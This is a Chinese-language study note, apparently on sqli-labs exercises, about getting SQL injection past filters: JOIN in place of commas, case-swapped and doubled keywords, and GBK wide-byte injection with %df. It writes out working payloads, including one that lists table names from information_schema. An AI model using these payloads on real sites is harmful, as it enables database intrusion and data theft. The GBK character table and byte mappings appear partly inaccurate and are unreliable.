### 逗号过滤join绕过

不知道为什么找不到逗号过滤的靶场，凑合着看吧

先介绍一下 join 的作用，比如说现在我们想实现两张表一起查询，我们就可以这样

select u.*,e.*
from users u,emails e
where u.id=e.id

![image-20260126122309457](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126122309457.png)

使用join之后：

select u.*,e.*
from users u join emails e on u.id=e.id

![image-20260126122516313](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126122516313.png)

可以看到我们达到的效果是一样的

所以，当我们使用 union select 1,2,3 时其逗号被过滤的时候，可以构造命令

```
select * from users where id=1 union select * from (select 1)a join (select 2)b join (select 3)c
```

![image-20260126123218101](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126123218101.png)

可以看到我们能达到 union select 1,2,3 一样的效果



所以在payload里我们可以构造命令 ?id=-1 union select * from (select 1)a join (select 2)b join (select 3)c --+

就可以绕过 waf 了

之后就可以在括号里替换我们想要查询的命令

查表名：

?id=-1 union select * from (select 1)a join (select 2)b join (select group_concat(table_name) from information_schema.tables where table_schema=database())c --+

查列名略

在查询用户名和密码的时候就不能用逗号了，所以只能分开来查，先查用户名，再查密码





### select 以及 union 过滤

以 less-27 为例

![image-20260126124335854](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126124335854.png)

我们能看到 or 没有被过滤，空格被过滤了，注释符被过滤了

我们尝试大小写或者复写绕过。

大小写：

![image-20260126130020264](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126130020264.png)

复写只有union可以

![image-20260126130414666](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126130414666.png)

或者报错注入：

![5495a6139cc111d7deb4ac83a82fce99](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\5495a6139cc111d7deb4ac83a82fce99.jpg)







### 宽字节注入绕过

![63e449aab9688635a6133215ce7bc1d8](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\63e449aab9688635a6133215ce7bc1d8.jpg)

我们拿 less-32 举例

![image-20260126162004182](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126162004182.png)

可以看到 ‘ 变为 \'

我们看一下源代码：

![Screenshot_20260126_162104_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260126_162104_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

了解一下 GBKB 编码，宽字节绕过的前提就是数据库使用 GBK 编码

![Screenshot_20260126_162307_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260126_162307_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)



DF      0	1	   2	  3	 4	  5	  6	7	   8	  9	 A	 B	  C	D	  E	  F
4	這	迨	連	迮	迯	迴	迴	迴	逑	逑	造	逡	進	逬	道	連
5	遏	逹	逺	造	遏	遺	遙	遅	遆	遈	退	遊	運	還	過	達
6	違	遖	遙	遚	遜	遜	遞	遡	遇	遺	遺	遞	遧	遨	遾	遨
7	遨	遻	遺	遼	遼	遼	遼	選	遼	遺	遼	遼	遼	遼	邁	邁
8	還	邅	邃	邇	邊	邊	邃	邃	邃	邏	邏	邗	邙	邘	邛	邚
9	邜	邞	邟	邠	邡	邤	邥	邧	邨	邩	邫	邭	邲	邴	邶	邷
A	邸	捂	擷	擔	撐	撢	撳	撽	擁	擠	擺	擺	擡	擣	弋	式
B	武	甙	卟	叱	叽	叩	叨	叻	吒	吖	吆	呋	呒	呓	呔	呖
C	呃	吡	呗	呙	吣	吲	咂	咔	呷	呱	呤	咚	咛	咄	呶	呦
D	咝	哐	咭	哂	咴	哒	咧	咦	哓	哔	呲	咣	哆	咻	咿	哌
E	哙	哚	哜	咩	咪	咤	哝	哏	哞	唛	哧	唠	哽	唔	哳	唢
F	唣	唏	唑	唧	唪	啧	喏	喵	啉	啭	啕	啕	唿	啐	唼

%DF%5c 对应的就是 ---> 運

本质就是使斜线失去注释的功能

构造命令：?id=-1%df' union select 1,2,3--+

![image-20260126163432105](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260126163432105.png)

可以发现注入成功了

###### 当 %df 被禁用时：

在GBK编码规则中，一个汉字由高位字节（第1字节） 和低位字节（第2字节） 组成，其中低位字节可以是  \  对应的十六进制值  0x5c 。

满足第2字节为 0x5c 的GBK汉字，核心是找高位字节在  0x81–0xFE （129-254） 区间，且与  0x5c  组合后属于GBK编码表的合法字符，常见的有这些：

-  0x81 0x5c  → 对应汉字 丂
-  0x83 0x5c  → 对应汉字 亙
-  0x84 0x5c  → 对应汉字 亜
-  0x86 0x5c  → 对应汉字 仐
-  0x88 0x5c  → 对应汉字 仼
-  0x8c 0x5c  → 对应汉字 价
-  0x90 0x5c  → 对应汉字 俉

这些组合的作用和  %df%5c  一致，在宽字节注入场景中，能和转义符  \ （0x5c）拼接成合法汉字，从而释放被转义的单引号等注入字符。

